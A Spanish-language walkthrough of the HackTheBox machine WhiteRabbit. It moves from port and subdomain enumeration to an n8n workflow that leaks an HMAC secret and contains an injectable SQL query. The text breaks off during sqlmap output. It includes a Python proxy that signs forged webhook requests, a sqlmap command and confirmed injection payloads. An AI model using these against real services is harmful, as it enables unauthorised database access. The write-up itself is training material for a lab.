---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# WhiteRabbit HackTheBox (Insane)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 04:35 EDT
Nmap scan report for 10.10.11.63
Host is up (0.030s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)
|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)
80/tcp   open  http    Caddy httpd
|_http-title: Did not follow redirect to http://whiterabbit.htb
|_http-server-header: Caddy
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)
|_  256 ad:42:c0:28:77:dd:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.99 seconds
```

Veremos que hay varios puertos, pero entre ellos el `80` que contiene una pagina web en la cual nos esta redirigiendo a un dominio llamado `whiterabbit.htb` el cual vamos añadir a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>              whiterabbit.htb
```

Lo guardamos y si entramos de esta forma con dicho dominio:

```
URL = http://whiterabbit.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-29 103933.png" alt=""><figcaption></figcaption></figure>

Veremos que es una pagina de una empresa que se dedica a ofrecer servicios de `pentesting`, por lo que vamos a investigar un poco la web.

## FFUF

Si realizamos un poco de `fuzzing` a nivel de `subdominios` veremos lo siguiente:

```shell
ffuf -c -w subdomains.txt -u http://whiterabbit.htb -H "Host: FUZZ.whiterabbit.htb" -fs 0
```

Info:

```
ffuf -c -w subdomains.txt -u http://whiterabbit.htb -H "Host: FUZZ.whiterabbit.htb" -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://whiterabbit.htb
 :: Wordlist         : FUZZ: /home/kali/Desktop/whiterabbit/subdomains.txt
 :: Header           : Host: FUZZ.whiterabbit.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

status                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 39ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Veremos que nos encontro un `subdominio` llamado `status`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>            whiterabbit.htb status.whiterabbit.htb
```

Lo guardamos y entramos en dicho `subdominio` a ver que vemos:

```
URL = http://status.whiterabbit.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-29 104657.png" alt=""><figcaption></figcaption></figure>

Vemos un `login` de un `software` en concreto llamado `Uptime Kuma`, si buscamos alguna vulnerabilidad de dicho `software` o alguna version del mismo, veremos algunas pero no sabemos que version tiene, por lo que vamos a realizar un poco de `fuzzing` a nivel `web`.

Buscando mucho, si buscamos la estructura de la pagina web o le preguntamos a la `IA` nos saca varios directorios en los que mirar, entre ellos descubrimos un `login` de `http-get` llamado `/metrics` y otro directorio web llamado `/status`, si tiramos un `gobuster` a `/status`...

## Gobuster

```shell
gobuster dir -u http://status.whiterabbit.htb/status/ -w <WORDLIST> -t 100 -k -r 
```

Info:

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://status.whiterabbit.htb/status/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 200) [Size: 2444]
/secci�               (Status: 400) [Size: 13]
/temp                 (Status: 200) [Size: 3359]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos varias cosas interesantes, entre ellas si entramos a `/temp` veremos lo siguiente:

```
URL = http://status.whiterabbit.htb/status/temp
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-29 111323.png" alt=""><figcaption></figcaption></figure>

Vemos como una especie de panel de `status` a nivel web, pero si inspeccionamos el codigo veremos lo siguiente:

```html
<link rel="manifest" href="/api/status-page/temp/manifest.json">
```

Vemos una ruta `/api` la cual es interesante, si vamos a dicha `api` pero sin entrar en el `.json` veremos lo siguiente:

```
URL = http://status.whiterabbit.htb/api/status-page/temp/
```

Info:

```json
{"config":{"slug":"temp","title":"Testpage (temporary)","description":null,"icon":"/icon.svg","theme":"auto","published":true,"showTags":false,"customCSS":"body {\n  \n}\n","footerText":null,"showPoweredBy":true,"googleAnalyticsId":null,"showCertificateExpiry":false},"incident":null,"publicGroupList":[{"id":1,"name":"Dienste","weight":1,"monitorList":[{"id":3,"name":"gophish (ddb09a8558c9.whiterabbit.htb)","sendUrl":0,"type":"http"},{"id":2,"name":"n8n [Production]","sendUrl":0,"type":"http"},{"id":1,"name":"website (whiterabbit.htb)","sendUrl":0,"type":"http"},{"id":5,"name":"wikijs (a668910b5514e.whiterabbit.htb) [DEV]","sendUrl":0,"type":"http"}]}],"maintenanceList":[]}
```

Veremos la informacion de la `API` que en este caso expone `2` `subdominios` que son los siguientes:

```
1: ddb09a8558c9.whiterabbit.htb
2: a668910b5514e.whiterabbit.htb
```

Si los añadimos en nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>           whiterabbit.htb status.whiterabbit.htb ddb09a8558c9.whiterabbit.htb a668910b5514e.whiterabbit.htb
```

Lo guardamos y si entramos al primero...

```
URL = http://ddb09a8558c9.whiterabbit.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-29 112524.png" alt=""><figcaption></figcaption></figure>

Veremos el `software` de `Gophish` que se utiliza para realizar campañas de `Pishing`, pero si entramos en el segundo:

```
URL = http://a668910b5514e.whiterabbit.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-29 112630.png" alt=""><figcaption></figcaption></figure>

Veremos otro `software` que se utiliza por asi decirlo como apuntes o foro a nivel de aprendizaje, si nos vamos a la seccion de `GoPhish Webhooks` veremos una explicacion del `software` `gophish` y si bajamos un poco veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-29 112738.png" alt=""><figcaption></figcaption></figure>

Vemos que nos podemos descargar un archivo que muestra lo siguiente:

```json
{
  "name": "Gophish to Phishing Score Database",
  "nodes": [
    {
      "parameters": {
        "respondWith": "text",
        "responseBody": "Error: No signature found in request header",
        "options": {}
      },
      "id": "c77c4304-a74e-4699-9b2c-52c7a8500fb4",
      "name": "no signature",
      "type": "n8n-nodes-base.respondToWebhook",
      "typeVersion": 1.1,
      "position": [
        660,
        620
      ]
    },
    {
      "parameters": {
        "respondWith": "text",
        "responseBody": "Error: Provided signature is not valid",
        "options": {}
      },
      "id": "da08f3e5-60c4-4898-ab28-d9f92aae2fe2",
      "name": "invalid signature",
      "type": "n8n-nodes-base.respondToWebhook",
      "typeVersion": 1.1,
      "position": [
        1380,
        540
      ]
    },
    {
      "parameters": {
        "operation": "executeQuery",
        "query": "UPDATE victims\nSET phishing_score = phishing_score + 10\nWHERE email = $1;",
        "options": {
          "queryReplacement": "={{ $json.email }}"
        }
      },
      "id": "e83be7d7-0c4a-4ca8-b341-3a40739f8825",
      "name": "Update Phishing Score for Clicked Event",
      "type": "n8n-nodes-base.mySql",
      "typeVersion": 2.4,
      "position": [
        2360,
        340
      ],
      "credentials": {
        "mySql": {
          "id": "qEqs6Hx9HRmSTg5v",
          "name": "mariadb - phishing"
        }
      }
    },
    {
      "parameters": {
        "conditions": {
          "options": {
            "caseSensitive": true,
            "leftValue": "",
            "typeValidation": "strict"
          },
          "conditions": [
            {
              "id": "ad6553f3-0e01-497a-97b5-3eba88542a11",
              "leftValue": "={{ $('Webhook').item.json.body.message }}",
              "rightValue": 0,
              "operator": {
                "type": "string",
                "operation": "exists",
                "singleValue": true
              }
            },
            {
              "id": "2a041864-d4b5-4c7d-a887-68792d576a73",
              "leftValue": "={{ $('Webhook').item.json.body.message }}",
              "rightValue": "Clicked Link",
              "operator": {
                "type": "string",
                "operation": "equals",
                "name": "filter.operator.equals"
              }
            }
          ],
          "combinator": "and"
        },
        "options": {}
      },
      "id": "c4c08710-b02c-4625-bdc3-19de5653844d",
      "name": "If Clicked",
      "type": "n8n-nodes-base.if",
      "typeVersion": 2,
      "position": [
        2120,
        320
      ]
    },
    {
      "parameters": {
        "operation": "executeQuery",
        "query": "UPDATE victims\nSET phishing_score = phishing_score + 50\nWHERE email = $1;",
        "options": {
          "queryReplacement": "={{ $json.email }}"
        }
      },
      "id": "220e3d9d-07f1-425e-a139-a51308737a89",
      "name": "Update Phishing Score for Submitted Data",
      "type": "n8n-nodes-base.mySql",
      "typeVersion": 2.4,
      "position": [
        2360,
        560
      ],
      "credentials": {
        "mySql": {
          "id": "qEqs6Hx9HRmSTg5v",
          "name": "mariadb - phishing"
        }
      }
    },
    {
      "parameters": {
        "conditions": {
          "options": {
            "caseSensitive": true,
            "leftValue": "",
            "typeValidation": "strict"
          },
          "conditions": [
            {
              "id": "ad6553f3-0e01-497a-97b5-3eba88542a11",
              "leftValue": "={{ $('Webhook').item.json.body.message }}",
              "rightValue": 0,
              "operator": {
                "type": "string",
                "operation": "exists",
                "singleValue": true
              }
            },
            {
              "id": "2a041864-d4b5-4c7d-a887-68792d576a73",
              "leftValue": "={{ $('Webhook').item.json.body.message }}",
              "rightValue": "Submitted Data",
              "operator": {
                "type": "string",
                "operation": "equals",
                "name": "filter.operator.equals"
              }
            }
          ],
          "combinator": "and"
        },
        "options": {}
      },
      "id": "9f49f588-12b7-4e3a-8d1a-74898b215d60",
      "name": "If Submitted Data",
      "type": "n8n-nodes-base.if",
      "typeVersion": 2,
      "position": [
        2120,
        500
      ]
    },
    {
      "parameters": {
        "respondWith": "text",
        "responseBody": "Success: Phishing score is updated",
        "options": {}
      },
      "id": "58eecf3c-97e9-4879-aaec-cd5759cb1ef8",
      "name": "Success",
      "type": "n8n-nodes-base.respondToWebhook",
      "typeVersion": 1.1,
      "position": [
        2660,
        460
      ]
    },
    {
      "parameters": {
        "conditions": {
          "options": {
            "caseSensitive": true,
            "leftValue": "",
            "typeValidation": "strict"
          },
          "conditions": [
            {
              "id": "8e2c34bd-a337-41e1-94a4-af319a991680",
              "leftValue": "={{ $json.signature }}",
              "rightValue": "={{ $json.calculated_signature }}",
              "operator": {
                "type": "string",
                "operation": "equals",
                "name": "filter.operator.equals"
              }
            }
          ],
          "combinator": "and"
        },
        "options": {}
      },
      "id": "8b12bac8-f513-422e-a582-99f67b87b24f",
      "name": "Compare signature",
      "type": "n8n-nodes-base.if",
      "typeVersion": 2,
      "position": [
        1100,
        340
      ]
    },
    {
      "parameters": {
        "respondWith": "text",
        "responseBody": "={{ $json.message }} | {{ JSON.stringify($json.error)}}",
        "options": {}
      },
      "id": "d3f8446a-81af-4e5a-894e-e0eab0596364",
      "name": "DEBUG: REMOVE SOON",
      "type": "n8n-nodes-base.respondToWebhook",
      "typeVersion": 1.1,
      "position": [
        1620,
        20
      ]
    },
    {
      "parameters": {
        "conditions": {
          "options": {
            "caseSensitive": true,
            "leftValue": "",
            "typeValidation": "strict"
          },
          "conditions": [
            {
              "id": "593bdf17-d38a-49a2-8431-d29679082aae",
              "leftValue": "={{ $json.headers.hasField('x-gophish-signature') }}",
              "rightValue": "true",
              "operator": {
                "type": "boolean",
                "operation": "true",
                "singleValue": true
              }
            }
          ],
          "combinator": "and"
        },
        "options": {}
      },
      "id": "0abc2e19-6ccc-4114-bf27-938b98ad5819",
      "name": "Check gophish header",
      "type": "n8n-nodes-base.if",
      "typeVersion": 2,
      "position": [
        440,
        440
      ]
    },
    {
      "parameters": {
        "jsCode": "const signatureHeader = $json.headers[\"x-gophish-signature\"];\nconst signature = signatureHeader.split('=')[1];\nreturn { json: { signature: signature, body: $json.body } };"
      },
      "id": "49aff93b-5d21-490d-a2af-95611d8f83d1",
      "name": "Extract signature",
      "type": "n8n-nodes-base.code",
      "typeVersion": 2,
      "position": [
        660,
        340
      ]
    },
    {
      "parameters": {
        "action": "hmac",
        "type": "SHA256",
        "value": "={{ JSON.stringify($json.body) }}",
        "dataPropertyName": "calculated_signature",
        "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
      },
      "id": "e406828a-0d97-44b8-8798-6d066c4a4159",
      "name": "Calculate the signature",
      "type": "n8n-nodes-base.crypto",
      "typeVersion": 1,
      "position": [
        860,
        340
      ]
    },
    {
      "parameters": {
        "conditions": {
          "options": {
            "caseSensitive": true,
            "leftValue": "",
            "typeValidation": "strict"
          },
          "conditions": [
            {
              "id": "4f69b753-a1ff-4376-88a0-032ede5d9223",
              "leftValue": "={{ $json.keys() }}",
              "rightValue": "",
              "operator": {
                "type": "array",
                "operation": "empty",
                "singleValue": true
              }
            },
            {
              "id": "9605ee34-f897-48cf-93d9-756503337686",
              "leftValue": "",
              "rightValue": "",
              "operator": {
                "type": "string",
                "operation": "equals",
                "name": "filter.operator.equals"
              }
            }
          ],
          "combinator": "and"
        },
        "options": {}
      },
      "id": "72f5d0bd-9025-4e7b-8d1f-8746035a2138",
      "name": "check if user exists in database",
      "type": "n8n-nodes-base.if",
      "typeVersion": 2,
      "position": [
        1620,
        240
      ],
      "alwaysOutputData": true,
      "executeOnce": true
    },
    {
      "parameters": {
        "operation": "executeQuery",
        "query": "SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1",
        "options": {}
      },
      "id": "5929bf85-d38b-4fdd-ae76-f0a61e2cef55",
      "name": "Get current phishing score",
      "type": "n8n-nodes-base.mySql",
      "typeVersion": 2.4,
      "position": [
        1380,
        260
      ],
      "alwaysOutputData": true,
      "retryOnFail": false,
      "executeOnce": false,
      "notesInFlow": false,
      "credentials": {
        "mySql": {
          "id": "qEqs6Hx9HRmSTg5v",
          "name": "mariadb - phishing"
        }
      },
      "onError": "continueErrorOutput"
    },
    {
      "parameters": {
        "respondWith": "text",
        "responseBody": "Info: User is not in database",
        "options": {}
      },
      "id": "e9806005-9ca3-4899-9b62-8d9d56ec413f",
      "name": "user not in database",
      "type": "n8n-nodes-base.respondToWebhook",
      "typeVersion": 1.1,
      "position": [
        1960,
        140
      ]
    },
    {
      "parameters": {
        "httpMethod": "POST",
        "path": "d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d",
        "responseMode": "responseNode",
        "options": {}
      },
      "id": "e425306c-06ba-441b-9860-170433602b1a",
      "name": "Webhook",
      "type": "n8n-nodes-base.webhook",
      "typeVersion": 2,
      "position": [
        220,
        440
      ],
      "webhookId": "d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"
    },
    {
      "parameters": {
        "errorMessage": "User not found. This should not happen"
      },
      "id": "ec2fc3c3-014f-49b7-af14-263b2d41250d",
      "name": "Stop and Error",
      "type": "n8n-nodes-base.stopAndError",
      "typeVersion": 1,
      "position": [
        2180,
        140
      ]
    },
    {
      "parameters": {
        "errorMessage": "User not found. This should not happen"
      },
      "id": "f6d17a91-3305-488e-bb2a-79d10ec00c57",
      "name": "Stop",
      "type": "n8n-nodes-base.stopAndError",
      "typeVersion": 1,
      "position": [
        1840,
        20
      ]
    }
  ],
  "pinData": {},
  "connections": {
    "If Clicked": {
      "main": [
        [
          {
            "node": "Update Phishing Score for Clicked Event",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "If Submitted Data": {
      "main": [
        [
          {
            "node": "Update Phishing Score for Submitted Data",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Update Phishing Score for Clicked Event": {
      "main": [
        [
          {
            "node": "Success",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Update Phishing Score for Submitted Data": {
      "main": [
        [
          {
            "node": "Success",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Compare signature": {
      "main": [
        [
          {
            "node": "Get current phishing score",
            "type": "main",
            "index": 0
          }
        ],
        [
          {
            "node": "invalid signature",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Check gophish header": {
      "main": [
        [
          {
            "node": "Extract signature",
            "type": "main",
            "index": 0
          }
        ],
        [
          {
            "node": "no signature",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Extract signature": {
      "main": [
        [
          {
            "node": "Calculate the signature",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Calculate the signature": {
      "main": [
        [
          {
            "node": "Compare signature",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "check if user exists in database": {
      "main": [
        [
          {
            "node": "user not in database",
            "type": "main",
            "index": 0
          }
        ],
        [
          {
            "node": "If Clicked",
            "type": "main",
            "index": 0
          },
          {
            "node": "If Submitted Data",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Get current phishing score": {
      "main": [
        [
          {
            "node": "check if user exists in database",
            "type": "main",
            "index": 0
          }
        ],
        [
          {
            "node": "DEBUG: REMOVE SOON",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Webhook": {
      "main": [
        [
          {
            "node": "Check gophish header",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "user not in database": {
      "main": [
        [
          {
            "node": "Stop and Error",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "DEBUG: REMOVE SOON": {
      "main": [
        [
          {
            "node": "Stop",
            "type": "main",
            "index": 0
          }
        ]
      ]
    }
  },
  "active": true,
  "settings": {
    "executionOrder": "v1"
  },
  "versionId": "803dfe3a-9d37-4e37-8a74-9281cf6aad25",
  "meta": {
    "templateCredsSetupCompleted": true,
    "instanceId": "21894d8ad64e6c729da4131f6f85c4f5b635dd24a4cd990abd2d7df2c0b9c3e5"
  },
  "id": "WDCH0NwAZIztoV3u",
  "tags": [
    {
      "createdAt": "2024-08-28T11:11:04.551Z",
      "updatedAt": "2024-08-28T11:11:04.551Z",
      "id": "EXjKCJjO0OPsnJqx",
      "name": "database"
    },
    {
      "createdAt": "2024-08-28T11:11:02.744Z",
      "updatedAt": "2024-08-28T11:11:02.744Z",
      "id": "JuPt3zEtHwmK6jur",
      "name": "gophish"
    }
  ]
}
```

Veremos una clave secreta `"secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"`, pero si nos vamos a la captura anterior donde pone una peticion capturada por `BurpSuite` veremos que tiene acompañado un `host` que es el siguiente:

```
Host: 28efa8f7df.whiterabbit.htb
```

Vamos añadirlo a nuestro archivo `hosts` para ver que contiene:

```shell
nano /etc/hosts

#Dentro del nano
<IP>           whiterabbit.htb status.whiterabbit.htb ddb09a8558c9.whiterabbit.htb a668910b5514e.whiterabbit.htb 28efa8f7df.whiterabbit.htb
```

Lo guardamos y entramos a dicho `subdominio` a ver que vemos:

```
URL = http://28efa8f7df.whiterabbit.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-29 112920.png" alt=""><figcaption></figcaption></figure>

Veremos que nada mas entrar nos esta pidiendo que actualicemos el `software` de `n8n`, por lo que nos esta dando una pista de que no esta actualizado.

## SQLi

Pero no sera nada interesante, si volvemos a la pagina de `Wiki.js` en la seccion de `http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks` leyendo un poco vemos que comprueba el usuario mediante la validacion de un correo electronico respecto a la pagina de `GoPhish`, por lo que puede que haya un `SQLi`.

Vamos a crear una firma rapida con nuestra peticion personalizada de esta forma con `CyberChef`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-29 115750.png" alt=""><figcaption></figcaption></figure>

Obtendremos algo asi:

```
cd8dd47858a7e9021ed6a882cfbf9bfacf80ef40d8a9bb6c4228ae716a652ef2
```

Sabiendo que funciona eso, vamos hacer lo siguiente.

Nos vamos a crear un script que actue como `proxy` para `sqlmap` y asi que se generen las firmas de forma automatica por el script de `proxy` y que `sqlmap` las utilice para realizar un escaneo de vulnerabilidades a dicha pagina para obtener informacion, asi hacemos todo esto proceso mas eficiente en vez de que `sqlmap` las genere de forma automatica ya que seria mas lento el proceso.

> proxy.py

```python
#!/usr/bin/env python3
# hmac_proxy_final.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import hmac
import hashlib
import json
import requests
import re

SECRET = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
TARGET_BASE = "http://28efa8f7df.whiterabbit.htb"

class HMACProxyHandler(BaseHTTPRequestHandler):
    
    def do_POST(self):
        try:
            # Leer el cuerpo de la request
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            # EXTRAER la URL real del header Host
            host = self.headers.get('Host', '')
            path = self.path
            
            # Si SQLMap envía la URL completa en el path, extraer solo el path
            if 'http' in path:
                # Extraer solo el path de la URL completa
                match = re.search(r'/webhook/[\w-]+', path)
                if match:
                    path = match.group(0)
                else:
                    path = '/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d'
            
            target_url = TARGET_BASE + path
            print(f"[PROXY] Target URL: {target_url}")
            
            # Generar HMAC signature
            json_str = post_data.decode('utf-8')
            signature = hmac.new(
                SECRET.encode('utf-8'),
                json_str.encode('utf-8'),
                hashlib.sha256
            ).hexdigest()
            
            # Headers para el request real
            headers = {
                'Content-Type': 'application/json',
                'x-gophish-signature': f'sha256={signature}',
                'User-Agent': 'sqlmap/1.9.8'
            }
            
            print(f"[PROXY] Forwarding to: {target_url}")
            print(f"[PROXY] Signature: sha256={signature[:16]}...")
            
            response = requests.post(
                target_url, 
                data=json_str, 
                headers=headers,
                timeout=30,
                verify=False
            )
            
            # Devolver respuesta al cliente (SQLMap)
            self.send_response(response.status_code)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(response.content)
            
            print(f"[PROXY] Response Status: {response.status_code}")
            
        except Exception as e:
            print(f"[ERROR] {e}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b'Proxy Error')

    def log_message(self, format, *args):
        # Silenciar logs normales
        return

def run_proxy():
    server = HTTPServer(('127.0.0.1', 8888), HMACProxyHandler)
    print("🔧 HMAC SQLMap Proxy running on http://127.0.0.1:8888")
    print("🔧 Use: sqlmap --proxy=http://127.0.0.1:8888 ...")
    print("🔧 Press Ctrl+C to stop")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Proxy stopped")
        server.server_close()

if __name__ == '__main__':
    run_proxy()
```

Lo ejecutamos de esta forma:

```shell
python3 proxy.py
```

Info:

```
🔧 HMAC SQLMap Proxy running on http://127.0.0.1:8888
🔧 Use: sqlmap --proxy=http://127.0.0.1:8888 ...
🔧 Press Ctrl+C to stop
```

Ahora en otra terminal ejecutamos este comando de `sqlmap` para que coja las firmas del servidor de `proxy` que tenemos a la escucha:

```shell
sqlmap -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \
  --method=POST \
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  -p email \
  --proxy="http://127.0.0.1:8888" \
  --batch \
  --flush-session \
  --technique=BEU \
  --time-sec=2 \
  --threads=5
```

Info:

```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:06:22 /2025-09-29/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[07:06:22] [INFO] flushing session file
[07:06:22] [INFO] testing connection to the target URL
[07:06:22] [WARNING] turning off pre-connect mechanism because of incompatible server ('BaseHTTP/0.6 Python/3.13.7')
[07:06:22] [INFO] checking if the target is protected by some kind of WAF/IPS
[07:06:22] [INFO] testing if the target URL content is stable
[07:06:23] [INFO] target URL content is stable
[07:06:23] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic
[07:06:23] [WARNING] (custom) POST parameter 'JSON #1*' does not appear to be dynamic
[07:06:23] [INFO] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might be injectable (possible DBMS: 'MySQL')
[07:06:23] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[07:06:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:06:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[07:06:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[07:06:27] [WARNING] reflective value(s) found and filtering out
[07:06:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[07:06:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[07:06:41] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[07:06:42] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[07:06:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[07:06:43] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[07:06:43] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[07:06:43] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[07:06:43] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[07:06:43] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[07:06:43] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[07:06:43] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[07:06:43] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[07:06:44] [INFO] (custom) POST parameter 'JSON #1*' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[07:06:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[07:06:44] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[07:06:44] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[07:06:44] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[07:06:44] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[07:06:46] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[07:06:49] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[07:06:51] [INFO] testing 'MySQL UNION query (69) - 21 to 40 columns'
[07:06:53] [INFO] testing 'MySQL UNION query (69) - 41 to 60 columns'
[07:07:26] [INFO] testing 'MySQL UNION query (69) - 61 to 80 columns'
[07:07:29] [INFO] testing 'MySQL UNION query (69) - 81 to 100 columns'
(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 837 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: {"campaign_id":1,"email":"" RLIKE (SELECT (CASE WHEN (5978=5978) THEN '' ELSE 0x28 END))-- QtzV","message":"Clicked Link"}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
